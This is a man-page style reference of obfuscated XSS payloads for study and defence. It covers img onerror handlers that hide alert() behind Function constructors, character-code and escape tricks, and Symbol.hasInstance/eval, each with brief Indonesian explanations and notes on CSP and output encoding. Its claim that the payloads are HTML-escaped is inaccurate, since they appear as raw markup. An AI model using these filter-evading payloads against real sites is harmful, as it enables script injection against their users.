NAME
dios-xcopath — collection of obfuscated XSS snippets (documented, escaped, and explained)
SYNOPSIS
This document lists several obfuscated XSS examples for study and defensive research. All payloads are shown as escaped text to avoid accidental execution.
DESCRIPTION

The snippets below were collected for research into client-side injection techniques and obfuscation patterns. Each example is followed by a short, high-level explanation of the technique used and defensive notes.

Ethics & safety: Do NOT test these payloads on systems you do not own or do not have explicit written permission to test. Use isolated lab environments only. Responsible disclosure applies if you find real vulnerabilities.
EXAMPLES
(All examples are HTML-escaped to prevent execution when viewing this file)

1) Obfuscated XSS (simple)

<img src onerror=alert`1`>

Ringkasan: penggunaan onerror pada elemen gambar tanpa atribut src valid dan pemanggilan fungsi via template literal-style (alert`1`) — contoh singkat obfuscation/shortcut.

2) Basic (without direct eval)

<img src onerror="Function`al\x65rt\x281\x29`()">

Ringkasan: memanfaatkan constructor Function dan escape sequences untuk menyamarkan teks alert(1). Menunjukkan teknik menghindari deteksi berbasis string literal.

3) filter.constructor variants

<img src onerror="[].filter.constructor('('+('al'+'ert')+')(1)')()">
<img src onerror="[].filter.constructor(''+String.fromCharCode(97,108,101,114,116)+'(1)')()">
<img src onerror="[].filter.constructor('\u0061\u006c\u0065\u0072\u0074(1)')()">
<img src onerror="[].filter.constructor('\x61\x6c\x65\x72\x74(1)')()">

Ringkasan: semua varian memanggil constructor fungsi alternatif ([].filter.constructor) dan mengaburkan nama fungsi (alert) lewat concatenation, fromCharCode, Unicode escapes, dan hex escapes.

4) Indirect function call obfuscation with Symbol.hasInstance

<img src onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){\u0061\u006c\u0065\u0072\u0074(0)}})">
<img src onerror="let _=alert+0,x='alert'+_[14]+_[15];Array.prototype[Symbol.hasInstance]=eval;x instanceof []">

Ringkasan: teknik-teknik kreatif yang memakainya operator-builtins (instanceof, Symbol.hasInstance) untuk memicu evaluasi. Kompleksitasnya bertujuan mengaburkan alur eksekusi dari detektor sederhana.

DEFENSIVE NOTES (high-level)
  • Jangan mengandalkan blacklist sederhana pada kata tertentu (mis. "alert", "eval") — obfuscation dapat menyembunyikan kata-kata tersebut.
  • Prefer server-side output encoding/escaping sesuai konteks (HTML entity-encode untuk HTML body, attribute-encode untuk atribut, JS-escapes untuk inline scripts).
  • Gunakan Content Security Policy (CSP) yang ketat: nonces, sumber terpercaya, dan hindari unsafe-inline jika memungkinkan.
  • Hapus atau sanitasi atribut event handler (on\*) bila tidak diperlukan pada HTML yang dihasilkan dari input pengguna.
  • Gunakan HTTP-only & Secure untuk cookies; batasi hak akses DOM dan CORS kebijakan sesuai prinsip least privilege.
  • Audit library/template rendering engine yang dipakai — prefer template engines yang memaksa escaping secara default.
TESTING & LAB

Jika kamu melakukan penelitian, lakukan di lingkungan terisolasi (contoh: VM snapshot, container, atau lab sekolah). Catat setiap temuan dan laporkan kerentanan secara bertanggung jawab ke pemilik aplikasi sesuai kebijakan disclosure mereka.
